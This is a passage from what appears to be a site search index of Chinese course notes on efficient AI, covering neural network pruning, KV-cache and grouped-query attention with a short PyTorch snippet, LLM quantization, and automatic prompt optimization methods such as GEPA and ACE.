<p>\u8fd8\u6709\u4e00\u79cd\u65b9\u6848\u662f\u5f15\u5165\u53ef\u5b66\u4e60\u7684\u53c2\u6570\uff0c\u6bd4\u5982\u4e0b\u56fe\u4e2d\u7684\u7f29\u653e\u56e0\u5b50\uff0c\u5982\u679c\u6700\u7ec8\u8bad\u7ec3\u51fa\u6765\u7684\u7ed3\u679c\uff0c\u8fd9\u4e9b\u7f29\u653e\u56e0\u5b50\u6bd4\u8f83\u5c0f\uff0c\u53ef\u4ee5\u63a8\u51fa\u8fd9\u4e2a\u90e8\u5206\u7684\u4f5c\u7528\u8f83\u5c0f\uff0c\u6211\u4eec\u8003\u8651\u5c06\u5176\u8fdb\u884c\u526a\u679d\uff08\u8fd9\u90e8\u5206\u7684\u7f29\u653e\u56e0\u5b50\uff0c\u751a\u81f3\u53ef\u4ee5\u8003\u8651\u590d\u7528batch norm\u4e2d\u7684\u7f29\u653e\u56e0\u5b50\uff09</p> <p></p> <p>\u53c2\u6570\u7684\u526a\u679d\u548c\u8fde\u63a5\u7684\u526a\u679d\u662f\u4e0d\u540c\u7684\uff0c\u53c2\u6570\u7684\u526a\u679d\u5f80\u5f80\u662f\u5f88\u7c97\u7c92\u5ea6\u7684\uff0c\u5176\u76f8\u5f53\u4e8e\u77e9\u9635\u4e58\u6cd5\u4e2d\u4e00\u884c\u7684\u526a\u679d</p> <p></p> <p>\u53e6\u5916\u4e5f\u5b58\u5728\u4e00\u4e9b\u52a8\u6001\u7684\u65b9\u6848\uff0c\u6bd4\u5982Percentage-of-zero-based Pruning\uff0c\u4e4b\u524d\u8bb2\u8ff0\u7684\u65b9\u6848\u90fd\u662f\u9759\u6001\u5206\u6790\u53c2\u6570\uff0c\u8fd9\u79cd\u65b9\u6848\u662f\u5728\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u52a8\u6001\u5206\u6790\u6fc0\u6d3b\u503c\uff0c\u5c06\u5176\u4e2d0\u7684\u6bd4\u4f8b\u8f83\u9ad8\u7684\u4e00\u6279channel\u7ed9\u53bb\u6389\uff0c\u8fbe\u5230\u8282\u7701\u5185\u5b58\u7684\u76ee\u7684</p> <p>\u8fd8\u6709\u4e00\u79cd\u6280\u5de7\u662fRegression-Based Pruning\uff0c\u8fd9\u79cd\u65b9\u6848\u65e8\u5728\u5bf9\u4e8e\u67d0\u4e00\u5c42\u8fdb\u884c\u526a\u679d\uff0c\u56e0\u4e3a\u6574\u4e2a\u8fd0\u884c\u6df1\u5ea6\u7f51\u7edc\u6d88\u8017\u5de8\u5927\uff0c\u56e0\u6b64\u5728\u526a\u679d\u7684\u65f6\u5019\u53ef\u4ee5\u4ec5\u4ec5\u5c06\u4e00\u5c42\u7684\u8f93\u51fa\u548c\u8fd9\u4e00\u5c42\u7684\u6ee1\u72b6\u6001\u8fdb\u884c\u5bf9\u6bd4\uff0c\u8fdb\u884c\u526a\u679d\uff0c\u57fa\u4e8e\u8fd9\u6837\u5b50\u7684\u56de\u5f52\u76d1\u7763\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e0d\u6d88\u8017\u5927\u91cf\u8d44\u6e90\u7684\u60c5\u51b5\u4e0b\uff0c\u5206\u6790\u51fa\u54ea\u4e2achannel\u66f4\u9002\u5408\u526a\u679d</p> <p></p> <p>Pruning ratio</p> <p>\u5206\u6790\u4e00\u5c42\u8be5\u6709\u7684pruning ratio\uff0c\u6211\u4eec\u91c7\u7528\u4e00\u79cdsensitivity analysis\u7684\u5185\u5bb9\uff0c\u6709\u4e9b\u5c42\u5bf9\u4e8e\u526a\u679d\u975e\u5e38\u654f\u611f\uff0c\u53e6\u4e00\u4e9b\u5c42\u5219\u4e0d\u662f</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u6211\u4eec\u5c31\u662f\u5bf9\u4e8e\u67d0\u4e00\u5c42\u8fdb\u884c\u526a\u679d\uff0c\u968f\u540e\u5206\u6790accuracy\u7684\u53d8\u5316\uff0c\u6765\u786e\u5b9a\u8be5\u5c42\u7684\u654f\u611f\u5ea6</p> <p></p> <p>\u8fd9\u79cd\u65b9\u6848\u540c\u65f6\u4e5f\u4f5c\u4e3a\u526a\u679d\u7b97\u6cd5\u7684\u6b63\u786e\u6027\u5224\u65ad\uff0c\u4e00\u822c\u6765\u8bf4\u5728\u524d60%\u5927\u90e8\u5206\u6027\u80fd\u90fd\u4e0d\u4f1a\u4e25\u91cd\u4e0b\u964d\uff0c\u800c\u572890%\u591a\u7684\u65f6\u5019\u90fd\u4f1a\u6709\u4e0b\u964d\uff0c\u5982\u679c\u8fdd\u53cd\u4e86\u7c7b\u4f3c\u7684\u89c4\u5f8b\uff0c\u53ef\u80fd\u662f\u526a\u679d\u7b97\u6cd5\u5b9e\u73b0\u9519\u8bef\u7684\u8868\u73b0</p> <p>\u7b80\u5355\u7684\u65b9\u6848\u662f\u786e\u5b9a\u4e00\u4e2a\u7cbe\u5ea6\u4e0b\u964d\u7684\u9608\u503c\uff0c\u57fa\u4e8e\u8fd9\u4e2a\u9608\u503c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6bcf\u5c42\u5e94\u8be5\u6709\u7684pruning ratio</p> <p></p> <p>Automatic Pruning</p> <p>\u6211\u4eec\u60f3\u627e\u5230\u4e00\u79cd\u53ef\u6269\u5c55\u7684pruning\u7b97\u6cd5\uff0c\u800c\u4e0d\u662f\u4f9d\u8d56\u4e8e\u4eba\u7c7b\u4e13\u5bb6\u5bf9\u4e8e\u4e00\u4e2a\u5177\u4f53\u7684\u6a21\u578b\u53bb\u624b\u52a8\u8c03\u8bd5\uff0c\u8be5pruning\u7b97\u6cd5\u5e94\u5f53\u5728\u4e0d\u540c\u6a21\u578b\uff0c\u4e0d\u540c\u7684benchmark\u4e0a\u90fd\u53ef\u4ee5\u81ea\u52a8\u4f18\u5316\u627e\u5230\u5408\u9002\u7684\u65b9\u6848</p> <p>\u5b9e\u9645\u4e0a\u4ee3\u66ff\u4eba\u7c7b\u4e13\u5bb6\u7684\u53ef\u9a8c\u8bc1\u4efb\u52a1\uff0c\u662f\u4e00\u79cd\u5408\u9002\u7684\u5f3a\u5316\u5b66\u4e60\u573a\u666f\uff0c\u56e0\u6b64\u6211\u4eec\u4f1a\u5c06\u5176\u5b9a\u4e49\u4e3a\u4e00\u4e2aRL\u4efb\u52a1\uff0c\u6765\u6211\u4eec\u627e\u5230\u5408\u9002\u7684pruning ratio</p> <p></p> <p>\u8fd8\u6709\u4e00\u79cd\u53eb\u505aNetAdapt\u7684\u65b9\u6848\uff0c\u4e5f\u662f\u4ee5RL\u7684\u65b9\u6848\u4f18\u5316\u6a21\u578bpruning ratio</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/TinyML/#23-finetuning-retraining","title":"2.3. Finetuning &amp; retraining","text":"<p>\u6211\u4eec\u5728Pruning\u4e4b\u540e\u5f80\u5f80\u4f1a\u9009\u62e9\u5fae\u8c03\u91cd\u8bad\u7ec3\u6765\u83b7\u5f97\u66f4\u597d\u7684\u6027\u80fd\uff0c\u8fd9\u91cc\u4e5f\u6709\u4e00\u4e9b\u6280\u5de7</p> <p>\u9996\u5148\u6211\u4eec\u5982\u4f55\u9009\u62e9\u5b66\u4e60\u7387\uff0c\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u4f1a\u9009\u62e9\u66f4\u5c0f\u4e00\u4e9b\u7684\u5b66\u4e60\u7387\uff0c\u56e0\u4e3a\u6a21\u578b\u6b64\u65f6\u5e94\u8be5\u5df2\u7ecf\u5904\u4e8e\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u6700\u5c0f\u533a\u95f4\u4e86</p> <p>\u53e6\u5916\u4e5f\u53ef\u4ee5\u9009\u62e9\u8fed\u4ee3\u5f0f\u7684\u65b9\u6848\uff0c\u6bd4\u5982\u5148\u526a\u679d30%-&gt;\u5fae\u8c03-&gt;\u526a\u679d50%-&gt;\u5fae\u8c03\uff0c\u4f1a\u6bd4\u76f4\u63a5\u526a\u679d50%\u597d</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/TinyML/#24-system-support-for-sparsity","title":"2.4. System Support for Sparsity","text":"<p>EIE: Efficient Inference Engine</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/Transformer%20%26%20LLM/","title":"Transformer & LLM","text":"<p>\u8bfe\u7a0b\u7684\u7b2c\u4e8c\u90e8\u5206\u4e3b\u8981\u8bb2\u7279\u5b9a\u9886\u57df\u7684\u4f18\u5316\u6280\u672f\uff0c\u7b2c\u4e00\u5757\u662f\u5bf9LLM\u7cfb\u5217\u7684\u4f18\u5316\u6280\u672f</p> <p>\u524d\u9762\u4e00\u5927\u90e8\u5206\u662fLLM\u7684\u57fa\u7840\u77e5\u8bc6\uff0c\u5728\u5f88\u591a\u5730\u65b9\u5df2\u7ecf\u8bb0\u5f55\u8fc7\u4e86\uff0c\u4e0d\u518d\u505a\u8d58\u8ff0</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/Transformer%20%26%20LLM/#1-kv-cache","title":"1. KV-Cache","text":"<p>KV cache \u662f\u8fd9\u7c7b\u81ea\u56de\u5f52\u6a21\u578b\u4e2d\u6700\u91cd\u8981\u7684\u4e00\u7c7b\u4f18\u5316\u6280\u672f\u4e4b\u4e00\uff0c\u901a\u8fc7\u5bf9\u4e8econtext\u7684KV\u8fdb\u884c\u5b58\u50a8\uff0c\u4f7f\u5f97\u5728\u8fdb\u884cAttention\u8ba1\u7b97\u7684\u65f6\u5019\uff0c\u53ea\u9700\u8981\u8ba1\u7b97\u6700\u65b0\u8fdb\u6765\u7684token\u548c\u4e4b\u524d\u7684context\u7684attention\u5373\u53ef</p> <p>\u800c\u5728LLM\u8ffd\u6c42Long Context\u7684\u65f6\u5019\uff0cKV cache\u7684\u6240\u5360\u7684\u7a7a\u95f4\u4e5f\u4f1a\u53d8\u5f97\u975e\u5e38\u7684\u5927</p> <p></p> <p>\u4e00\u65e6\u7528\u6237\u53d8\u591a\uff08Batch size\u53d8\u5927\uff09KV cache \u5360\u636e\u7684\u5b58\u50a8\u7a7a\u95f4\u751a\u81f3\u5f88\u5bb9\u6613\u8d85\u8fc7\u6a21\u578b\u672c\u8eab\u7684\u5927\u5c0f</p> <p>\u8fd9\u91cc\u6211\u4eec\u5c31\u5f15\u5165\u4e86MHA MQA GQA\u7b49\u65b9\u6848\uff0cGQA\u662f\u8fd9\u51e0\u4e2a\u91cc\u9762\u6700\u4f18\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u8fd9\u4e2a\u548c\u65e9\u671f\u5bf9\u4e8eConv block\u7684\u4f18\u5316\u975e\u5e38\u76f8\u4f3c</p> <p></p> <p>\u8fd9\u4e9b\u65b9\u6848\u662f\u5728Attention Head\u4e0a\u505a\u5904\u7406\uff0c\u901a\u8fc7\u51cf\u5c11Attention Head\u7684\u6570\u91cf\uff0c\u6765\u51cf\u5c11KV cache\u7684\u5b58\u50a8\uff0c\u6807\u51c6\u7684MHA\u7684\u6211\u4eec\u6709h\u4e2aAttention Head\uff0c\u4e5f\u5c31\u6709h\u4e2aQKV\uff0cMQA\u505a\u7684\u6bd4\u8f83\u6781\u7aef\uff0c\u6211\u4eec\u53ea\u6709\u4e00\u4e2aKV\u6743\u91cd\uff0c\u4f46\u662f\u6709h\u4e2aQ\u6743\u91cd\uff0c\u56e0\u4e3aQ\u7684\u8ba1\u7b97\u662f\u9003\u4e0d\u6389\u7684\uff0c\u4f46\u662f\u8fd9\u79cd\u505a\u6cd5\u8fc7\u4e8e\u6781\u7aef\u5bfc\u81f4\u6027\u80fd\u8f83\u5dee\uff0cGQA\u5c31\u76f8\u5bf9\u505a\u5f97\u66f4\u597d\uff0c\u6211\u4eec\u8ba9\u51e0\u4e2aQ\u6743\u91cd\u5171\u4eab\u4e00\u4e2aKV\u6743\u91cd\uff0c\u8fd9\u6837\u5b50\u53ef\u4ee5\u505a\u5230\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u6743\u8861</p> <pre><code>class GroupedQueryAttention(nn.Module):\n    \"\"\"GQA\uff1aheads \u5206\u7ec4\uff0c\u6bcf\u7ec4\u5171\u4eab 1 \u7ec4 KV\"\"\"\n    def __init__(self, d_model, num_heads, num_kv_heads=None):\n        super().__init__()\n        self.num_heads = num_heads\n        self.num_kv_heads = num_kv_heads or num_heads // 8  # \u9ed8\u8ba4 8 \u7ec4\n        self.d_k = d_model // num_heads\n        self.num_queries_per_kv = num_heads // self.num_kv_heads\n\n        self.W_q = nn.Linear(d_model, d_model)\n        self.W_k = nn.Linear(d_model, self.num_kv_heads * self.d_k)  # G \u7ec4 key\n        self.W_v = nn.Linear(d_model, self.num_kv_heads * self.d_k)  # G \u7ec4 value\n        self.W_o = nn.Linear(d_model, d_model)\n</code></pre> <p>\u663e\u7136\u8fd9\u4e9b\u4f18\u5316\u90fd\u4e0d\u662fTraining-Free\u7684\u4f18\u5316\uff0c\u9700\u8981\u5728\u8bad\u7ec3\u4e2d\u5c31\u91c7\u7528\u5bf9\u5e94\u7684\u53d8\u79cd</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/Transformer%20%26%20LLM/#2-linear-units","title":"2. Linear Units","text":"<p>\u5bf9\u4e8eLinear Units\u7684\u66f4\u65b0\u65b9\u6848\u6709\u4e00\u79cd\u662fSwiGLU</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/Transformer%20%26%20LLM/#3-llm-deployment","title":"3. LLM Deployment","text":"<p>\u8fd9\u662f\u5173\u4e8eLLM\u90e8\u7f72\u76f8\u5173\u6280\u672f\u7684\u4ecb\u7ecd\uff0c\u4e3b\u8981\u662f\u4e09\u90e8\u5206</p> <ul> <li>Quantization</li> <li>Sparsity</li> <li>Systems\uff08like FlashAttention\uff09</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/Transformer%20%26%20LLM/#31-quantization","title":"3.1. Quantization","text":"<p>\u524d\u9762\u7684\u8bfe\u7a0b\u4e2d\u5df2\u7ecf\u4ecb\u7ecd\u8fc7\u4e86\u4e00\u4e9b\u91cf\u5316\u6280\u672f\uff0c\u4f46\u662f\u5b83\u4eec\u5927\u591a\u5728LLM scaling\u7684\u65f6\u5019\u4f1a\u5931\u6548\uff0c\u5e76\u4e0d\u9002\u7528\u4e8e\u5927\u578b\u6a21\u578b</p> <p></p> <p>\u5728\u5927\u89c4\u6a21\u7684\u8bad\u7ec3\u4e2d\uff0c\u4f1a\u51fa\u73b0\u4e00\u4e9b\u6fc0\u6d3b\u503c\u7684\u5f02\u5e38\u503c\uff0c\u6709\u4e9b\u6fc0\u6d3b\u503c\u4f1a\u5f02\u5e38\u5730\u5927\uff0c\u5728\u505a\u5e38\u89c4\u5730\u91cf\u5316\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u6fc0\u6d3b\u503c\u4f1a\u5bfc\u81f4\u5927\u91cf\u7684\u5c0f\u6fc0\u6d3b\u503c\u88ab\u622a\u65ad\u4e3a0\uff0c\u8bad\u7ec3\u5c31\u4f1a\u5d29\u6e83</p> <p>\u4e8b\u5b9e\u4e0a\u5728\u6a21\u578b\u7684\u8bad\u7ec3\u4e2d\uff0c\u53c2\u6570\u7684\u91cf\u5316\u662f\u6bd4\u8f83\u5bb9\u6613\uff0c\u4f46\u662f\u6fc0\u6d3b\u503c\u7684\u91cf\u5316\u4f1a\u76f8\u5bf9\u56f0\u96be</p> <p></p> <p>\u9488\u5bf9\u6b64\u79cd\u73b0\u8c61\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u4e00\u79cd\u5bf9\u5e94\u7684\u91cf\u5316\u65b9\u6848\uff0c\u5c31\u662f\u5c06\u6fc0\u6d3b\u503c\u4e2d\u7684\u8f83\u5927\u7684\u90e8\u5206\u7f29\u5c0f\uff0c\u5c06\u5bf9\u5e94\u7684\u7f29\u653e\u56e0\u5b50\u8f6c\u6362\u5230\u5b83\u4eec\u8981\u8ba1\u7b97\u7684weight\u4e2d\uff0c\u4f7f\u5f97\u5bf9\u5e94\u7684\u6743\u91cd\u6269\u5927\uff0c\u5c31\u662f\u5c06100x1\u53d8\u621010x10\uff0c\u5728\u4fdd\u8bc1\u7ed3\u679c\u4e0d\u53d8\u7684\u60c5\u51b5\u4e0b\u5c3d\u53ef\u80fd\u6d88\u9664\u5f02\u5e38\u503c</p> <p></p> <p>\u5c06\u91cf\u5316\u7684\u538b\u529b\u5728\u6fc0\u6d3b\u503c\u548c\u53c2\u6570\u4e2d\u53d6\u5f97\u4e00\u4e2a\u5e73\u8861\u65f6\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u65b9\u6848\uff0c\u8fd9\u79cd\u79f0\u4e3aSmooth Quantization\u7684\u65b9\u6848\uff0c\u5728\u5177\u4f53\u7684Transformer\u5b9e\u73b0\u4e2d\u5982\u4e0b</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/prompt_optimize/Automatic%20Prompt%20Optimize/","title":"Automatic Prompt Optimize","text":"<p>Prompt\u5f88\u91cd\u8981\uff0c\u867d\u7136\u5728\u73b0\u9636\u6bb5\u4e0a\u4e0b\u6587\u5de5\u7a0b\u706b\u70ed\u7684\u60c5\u51b5\u4e0b\uff0c\u521d\u59cb\u7684System Prompt\u5f80\u5f80\u88ab\u4eba\u5ffd\u7565\uff0c\u4f46\u662f\u5176\u5728\u5bf9\u8bdd\u548c\u7279\u5b9a\u9886\u57df\u4e0a\u4f9d\u7136\u91cd\u8981\uff0c\u6211\u7684\u7406\u89e3\u4e2d</p> <ul> <li>Context Engineer \u4e3b\u8981\u5728\u505aMemory</li> <li>Prompt Engineer \u4e3b\u8981\u5728\u5b66\u4e60\u4e00\u79cd\u601d\u8003\u6a21\u5f0f</li> </ul> <p>\u56e0\u4e3a\u5927\u6a21\u578b\u7684\u80fd\u529b\u8fb9\u754c\u4e00\u76f4\u6ca1\u6709\u88ab\u51c6\u786e\u5b9a\u4e49\uff08\u4eba\u4eec\u79f0\u5176\u4e3a\u952f\u9f7f\u72b6\u7684\u667a\u80fd\uff09\uff0c\u5982\u679c\u8981\u4e3a\u4e00\u4e2a\u6a21\u578b\u5b9a\u5236\u4e00\u4efdPrompt\uff0c\u4f1a\u82b1\u8d39\u5f88\u5927\u7684\u4eba\u529b\uff0c\u56e0\u6b64\u7531\u5f88\u591a\u5de5\u4f5c\u60f3\u8981\u8ba9LLM\u81ea\u52a8\u4f18\u5316Prompt</p> <p>\u76f8\u5173\u5de5\u4f5c\u6709</p> <ul> <li>https://www.arxiv.org/abs/2510.04618 ACE</li> <li>https://arxiv.org/abs/2507.19457 GEPA</li> <li>https://arxiv.org/abs/2510.08191 Training Free GRPO</li> <li>https://arxiv.org/abs/2502.16923 Survey for APO</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/prompt_optimize/Automatic%20Prompt%20Optimize/#0-survey-of-apo","title":"0. Survey of APO","text":"<p>\u4e00\u4e2aAPO\u6d41\u7a0b\u4e00\u822c\u5305\u542b\u4ee5\u4e0b\u5143\u7d20</p> <ul> <li>Seed Prompt \u521d\u59cb\u7684\u63d0\u793a\u8bcd</li> <li>Inference Evaluation and Feedback \u6267\u884c\u4e00\u4e2a\u4efb\u52a1\u5e76\u4e14\u83b7\u5f97\u53cd\u9988<ul> <li>Numeric Score Feedback</li> <li>LLM Feedback</li> <li>Human Feedback</li> </ul> </li> <li>Candidate Prompt Generation \u751f\u6210\u5019\u9009\u7684\u63d0\u793a\u8bcd<ul> <li>\u542f\u53d1\u5f0fEdit\uff1a\u76f4\u63a5\u8ba9LLM\u751f\u6210\u65b0\u7684\u63d0\u793a\u8bcd</li> <li>\u7528\u4e13\u95e8\u8bad\u7ec3\u7684\u795e\u7ecf\u7f51\u7edc\u6765\u63d0\u793a\u8bcd\u751f\u6210</li> <li>\u57fa\u4e8e\u8986\u76d6\u7684\u65b9\u6848</li> <li>\u7a0b\u5e8f\u5408\u6210</li> </ul> </li> <li>Filter and Retain Promising Prompts \u7b5b\u9009\u548c\u4fdd\u7559\u6709\u5e0c\u671b\u7684\u63d0\u793a\u8bcd<ul> <li>TopK</li> <li>\u4e0a\u7f6e\u4fe1\u754c</li> <li>\u533a\u57df\u8054\u5408\u6240\u6709</li> </ul> </li> <li>Iteration Depth<ul> <li>\u56fa\u5b9a\u6b65\u6570</li> <li>\u52a8\u6001\u6b65\u6570\uff0c\u6839\u636e\u6027\u80fd\u8fdb\u884c\u52a8\u6001\u8c03\u6574</li> </ul> </li> </ul> <p>\u4e00\u4e2a\u6b63\u5e38\u7684\u6d41\u7a0b\u5927\u6982\u662f\uff0c\u9996\u5148\u662f\u6709\u4e00\u4e2a\u521d\u59cb\u7684Prompt\uff0c\u968f\u540e\u8dd1\u4e00\u904dBenchmark\uff0c\u6839\u636e\u83b7\u5f97\u7684Feedback\u6765\u751f\u6210\u4e00\u6279\u65b0\u7684Candidate Prompt\uff0c\u57fa\u4e8e\u67d0\u4e2a\u89c4\u5219\u8fdb\u884c\u7b5b\u9009\uff0c\u7ef4\u62a4\u4e00\u4e2aCandidate Prompt Pool\uff0c\u5982\u6b64\u5faa\u73af</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/prompt_optimize/Automatic%20Prompt%20Optimize/#1-gepa","title":"1. GEPA","text":"<p>\u8fd9\u4e2a\u7b97\u662f\u6211\u4eec\u73b0\u5728\u7684Baseline\uff0c\u5176\u5177\u4f53\u7684\u6d41\u7a0b\u56fe\u5982\u4e0a\uff0c\u5176\u4f18\u5316\u7684\u7ed3\u679c\u793a\u4f8b\u5982\u4e0b</p> <p>\u5176\u4f18\u5316\u5177\u4f53\u7684\u6d41\u7a0b\u5982\u4e0b</p> <ul> <li>\u521d\u59cb\u5316Prompt\uff0c\u76f4\u63a5\u8fdb\u5165Candidate Pool\u4e2d</li> <li>\u5f00\u59cb\u6709\u4e00\u4e2a\u4f18\u5316\u5faa\u73af<ul> <li>\u8fdb\u884cCandidate Pool Filter\uff0c\u57fa\u4e8ePareto Frontier\u8fdb\u884c\u7b5b\u9009\uff08\u5bf9\u4e8e\u5176\u4e2d\u4efb\u4f55\u4e00\u4e2aPrompt\uff0c\u90fd\u627e\u4e0d\u5230\u53e6\u4e00\u4e2a\u5728\u6240\u6709\u4efb\u52a1\u4e0a\u90fd\u6bd4\u5b83\u597d\u6216\u8ddf\u5b83\u4e00\u6837\u597d\u7684Prompt\uff09</li> <li>Propose New Candidate\uff0c\u6bcf\u4e2aPrompt\u5176\u4f1a\u548c\u4e0a\u4e00\u6b21\u6267\u884c\u7684\u7ed3\u679c\u76f8\u8fde\uff0c\u6839\u636e\u8fd9\u4e2a\u4fe1\u606f\u76f4\u63a5\u4f18\u5316\u63d0\u793a\u8bcd\uff0c\u6216\u8005\u5176\u8fd8\u6709\u4e00\u79cd\u5c06\u4e24\u4e2a\u63d0\u793a\u8bcd\u7684\u4f18\u52bf\u7ed3\u5408\u7684\u65b9\u6848</li> <li>\u65b0\u751f\u6210\u7684Prompt\u8981\u7ecf\u8fc7\u4e00\u4e2a\u5c0fminiBatch\u7684\u8bc4\u6d4b\uff0c\u5982\u679c\u6ca1\u6709\u63d0\u5347\u76f4\u63a5\u4e22\u5f03\uff0c\u5982\u679c\u6709\u5219\u8fc7\u4e00\u4e2aTest\u96c6\u5408\uff0c\u5c06\u8fd9\u4e2a\u7ed3\u679c\u7eb3\u5165\u5230\u5f97\u5206\u77e9\u9635\u4e2d\uff0c\u5e76\u4e14\u5c06\u8fd9\u4e2aPrompt\u4e22\u5230Candidate Pool\u4e2d</li> </ul> </li> <li>\u91cd\u590d\u5982\u4e0a\u7684\u4f18\u5316\u5faa\u73af\uff0c\u76f4\u5230Budget\u7528\u5b8c</li> </ul> <p>\u5176\u6bd4\u8f83\u6838\u5fc3\u7684\u521b\u65b0\u70b9\u5728\u4e8e\u5f15\u5165\u4e86Pareto\u7684\u6982\u5ff5\uff0c\u8fd9\u4e2a\u7b5b\u9009\u673a\u5236\u53ef\u4ee5\u4fdd\u7559\u90a3\u4e9b\u5728\u7279\u5b9a\u4efb\u52a1\u4e0a\u8868\u73b0\u7a81\u51fa\u3001\u6709\u7279\u8272\u7684Prompt\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u90a3\u4e9b\u201c\u5e73\u5747\u5206\u201d\u9ad8\u7684Prompt\uff0c\u4ece\u800c\u4fdd\u8bc1\u4e86\u5019\u9009Prompt\u7684\u591a\u6837\u6027\uff0c\u907f\u514d\u9677\u5165\u201c\u5c40\u90e8\u6700\u4f18\u201d\u3002</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/prompt_optimize/Automatic%20Prompt%20Optimize/#2-ace","title":"2. ACE","text":"<ul> <li>\u6ca1\u5f00\u6e90\uff0c\u4e5f\u6ca1\u6709\u8fed\u4ee3\u5b8c\u6210\u7684Prompt\uff0c\u540d\u58f0\u5f88\u54cd\u4f46\u662f\u83ab\u5f97\u4ec0\u4e48\u53ef\u7528\u7684\u4e1c\u897f\uff0c\u7f51\u4e0a\u53ea\u80fd\u627e\u5230\u522b\u4eba\u590d\u73b0\u7684\u7ed3\u679c</li> </ul> <p>\u8fd9\u7bc7\u8bba\u6587\u6838\u5fc3\u8981\u89e3\u51b3\u7684\u95ee\u9898\u662f\u9488\u5bf9\u4e4b\u524d\u7684APO\u5de5\u4f5c\u5b58\u5728</p> <ul> <li>\u7b80\u6d01\u504f\u5dee\uff1a\u4e4b\u524d\u7684\u65b9\u6848\u4f18\u5316\u7684\u8fc7\u7a0b\u90fd\u8ffd\u6c42\u8d8a\u77ed\u8d8a\u597d\uff0c\u5bfc\u81f4\u7ec6\u8282\u7684\u7f3a\u5931</li> <li>\u4e0a\u4e0b\u6587\u574d\u7f29\uff1a\u603b\u662f\u4f9d\u8d56LLM\u4e00\u6b21\u6027\u91cd\u5199\u6574\u6bb5Prompt\uff0c\u4f1a\u5bfc\u81f4\u6700\u7ec8\u63d0\u793a\u8bcd\u53d8\u4e3a\u66f4\u77ed\u66f4\u6cdb\u7684\u6458\u8981\uff0c\u4f1a\u6709\u5173\u952e\u4fe1\u606f\u7684\u786e\u5b9e</li> </ul> <p>\u56e0\u6b64\u8fd9\u4e2a\u65b9\u6848\u4e2d\u5176\u5c06\u63d0\u793a\u8bcd\u4f18\u5316\u6539\u4e3a\u4e86\u7ef4\u62a4\u4e00\u4e2aPlayBook\uff0c\u8bbe\u8ba1\u4e86\u8fd9\u4e48\u4e09\u4e2a\u89d2\u8272</p> <ul> <li>Generator\uff1a\u9488\u5bf9\u65b0\u67e5\u8be2\u4ea7\u51fa\u5b8c\u6574\u63a8\u7406\u8f68\u8ff9\u3002</li> <li>Reflector\uff1a\u4ec5\u8d1f\u8d23\u201c\u8bc4\u5224+\u63d0\u53d6\u201d\uff0c\u628a\u6210\u8d25\u539f\u56e0\u8f6c\u5316\u4e3a\u53ef\u843d\u5730\u7684\u6218\u672f\u53e5\u5b50\uff1b\u72ec\u7acb\u89d2\u8272\u907f\u514d\u201c\u8bc4\u5224\u201d\u4e0e\u201c\u91cd\u5199\u201d\u8026\u5408\u9020\u6210\u7684\u4fe1\u606f\u4e22\u5931\u3002</li> <li>Curator\uff1a\u5c06 Reflector \u8f93\u51fa\u7684\u6218\u672f\u5c01\u88c5\u6210\u7ed3\u6784\u5316\u6761\u76ee\uff08bullet\uff09\uff0c\u5e76\u4ee5\u786e\u5b9a\u6027\u903b\u8f91\u5408\u5e76\u5230\u73b0\u6709\u624b\u518c\uff0c\u675c\u7edd LLM \u91cd\u5199\u5e26\u6765\u7684\u65b9\u5dee\u3002</li> </ul> <p>\u5e76\u4e14\u5728\u4f18\u5316\u7684\u8fc7\u7a0b\u4e2d\u5206\u4e24\u6b65\u8d70 - Grow\uff1a\u65b0\u7684\u6761\u76ee\u589e\u52a0 - Refine\uff1a\u7cbe\u70bc\uff0c\u8bed\u4e49\u5d4c\u5165\u53bb\u91cd\uff0c\u5408\u5e76\u6216\u6dd8\u6c70\u4f4e\u4ef7\u503c\u6761\u76ee</p> <p>\u6ca1\u6709\u5b8c\u6574\u7684\u793a\u4f8b\u548c\u5f00\u6e90\u7684\u4ee3\u7801</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/prompt_optimize/Automatic%20Prompt%20Optimize/#3-training-free-gpro","title":"3. Training-Free GPRO","text":"<ul> <li>https://github.com/TencentCloudADP/youtu-agent/tree/training_free_GRPO \u6709\u7ef4\u62a4\u7684\u6bd4\u8f83\u597d\u7684Codebase</li> </ul> <p>\u8fd9\u7bc7\u6587\u7ae0follow GRPO\u7684\u8303\u5f0f\u6765\u505aPrompt\u4f18\u5316</p> 